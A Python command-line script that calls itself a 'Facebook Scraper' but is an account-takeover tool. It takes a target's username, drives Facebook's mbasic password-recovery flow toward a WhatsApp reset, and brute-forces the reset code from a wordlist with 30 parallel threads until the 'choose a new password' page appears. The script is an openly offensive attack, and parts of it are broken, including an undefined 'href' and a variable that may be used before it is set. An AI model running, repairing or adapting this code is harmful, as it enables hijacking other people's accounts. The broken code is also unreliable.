import os
import sys
import requests
import re
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as Executor
import cmd
import argparse

class FacebookScraperPanel(cmd.Cmd):
    intro = "Welcome to Facebook Scraper. Type 'login' to start scraping or 'exit' to quit."
    prompt = "(facebook-scraper) "

    def do_login(self, arg):
        """Start scraping Facebook."""
        username = input("Enter your Facebook username or email: ")
        self.main(username)

    def do_exit(self, arg):
        """Exit the Facebook Scraper."""
        print("Exiting Facebook Scraper.")
        return True

    def main(self, username):
        url = 'https://web.facebook.com/'
        ua = ("Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36")

        # Create a requests session and set headers
        req = requests.Session()
        req.headers.update({
            'accept': ('text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,'
                       'image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),
            'accept-language': 'en_US',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': "Windows",
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua
        })

        # Step 1: Get the main page
        p = req.get(url)
        print("HTML Content:", p.text)  # Add this line for debugging
        soup = BeautifulSoup(p.text, 'html.parser')
        forms = soup.find_all('form')
        login_form = None
        for form in forms:
            inputs = form.find_all('input')
            input_names = [input.get('name') for input in inputs]
            if 'email' in input_names and 'pass' in input_names:
                login_form = form
                break

        if not login_form:
            print("Login form not found.")
            sys.exit(1)

        datax = login_form.get('action')

        weh = url + href

        # Step 2: Follow the link to the next page
        q = req.get(weh)
        no = BeautifulSoup(q.text, 'html.parser')
        lg = no.find('a', {'role': 'link'})
        if not lg:
            print("Login link not found.")
            sys.exit(1)
        hs = lg.get('href')
        wes = url + hs

        # Step 3: Follow the login link
        ad = req.get(wes)
        nl = BeautifulSoup(ad.text, 'html.parser')
        nm = nl.find('div', {'class': 'r s t'})

        # Initialize session and headers
        ses = requests.Session()
        heas = {
            "Host": "mbasic.facebook.com",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "user-agent": ua,
            "accept": ('text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,'
                       'image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        # Step 4: Get the login page
        link = ses.get(wes, headers=heas)
        gett = BeautifulSoup(link.text, "html.parser")
        form = gett.find("form", {"method": "post"})
        if not form:
            print("Login form not found.")
            sys.exit(1)
        datax = form["action"]

        # Extract required data for login
        data = {
            "lsd": re.search('name="lsd" value="(.*?)"', link.text).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"', link.text).group(1),
            "try_number": "0",
            "unrecognized_tries": "0",
            "email": username,
            "id_submit": "Search",
            "bi_xrwh": "0"
        }

        # Prepare the headers and cookies
        cookie = dict(ses.cookies.get_dict())
        head = {
            "Host": "mbasic.facebook.com",
            "content-length": "160",
            "cache-control": "max-age=0",
            "origin": "http://web.facebook.com",
            "upgrade-insecure-requests": "1",
            "dnt": "1",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": ua,
            "accept": ('text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,'
                       'image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "referer": ("http://web.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"),
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        # Step 5: Send login request
        xnxx = ses.post(f"https://web.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
        fb_cookies = ses.cookies.get_dict().keys()
        reqq = BeautifulSoup(xnxx.content, 'html.parser')
        print(reqq)
        nam = reqq.find('a', {'class': 'bh bj bk bo bl bp bi'})
        if not nam:
            print("Name link not found.")
            sys.exit(1)
        hss = nam.get('href')
        nexst = 'https://web.facebook.com' + hss

        # Repeat the login step to continue the process
        xx = ses.post(nexst, data=data, cookies=cookie, headers=head, allow_redirects=True)
        regt = BeautifulSoup(xx.content, 'html.parser')

        # Check if the reset action input exists
        input_element = regt.find('input', {'name': 'reset_action'})
        if input_element:
            value2 = input_element.get('value')
            datat = {
                "lsd": re.search('name="lsd" value="(.*?)"', xx.text).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', xx.text).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "recover_method": 'send_whatsapp_skip_bc',
                "reset_action": value2
            }
        else:
            value2 = "default_value"
            datat = {}

        fom = regt.find('form', {'method': 'post'})['action']
        nexty = 'https://web.facebook.com' + fom
        sr = ses.post(nexty, data=datat, cookies=cookie, headers=head, allow_redirects=True)
        rry = BeautifulSoup(sr.content, 'html.parser')

        def crack(n1):
            for n in n1:
                input_element = rry.find('input', {'name': 'reset_action'})
                if input_element:
                    value3 = input_element.get('value')
                    datar = {
                        "lsd": re.search('name="lsd" value="(.*?)"', xnxx.text).group(1),
                        "jazoest": re.search('name="jazoest" value="(.*?)"', xnxx.text).group(1),
                        "try_number": "0",
                        "unrecognized_tries": "0",
                        "n": n,
                        "reset_action": value3
                    }
                else:
                    value3 = "default_value"

                fotm = rry.find('form', {'method': 'post'})['action']
                next = 'https://web.facebook.com' + fotm
                ssr = ses.post(next, data=datar, cookies=cookie, headers=head, allow_redirects=True)
                if 'Pilih kata sandi baru' in ssr.text:
                    print("Successfully!!!")
                    exit()
                else:
                    sys.stdout.write(f"\rFailed - {n}")
                    sys.stdout.flush()

        number_list = []
        with Executor(max_workers=30) as via:
            try:
                with open('wordlist.txt', 'r') as passt:
                    for passw in passt:
                        if len(passw.strip()) > 6:
                            n1 = [passw.strip()]
                            via.submit(crack, n1)
            except FileNotFoundError:
                print("wordlist.txt not found.")

if __name__ == '__main__':
    FacebookScraperPanel().cmdloop()
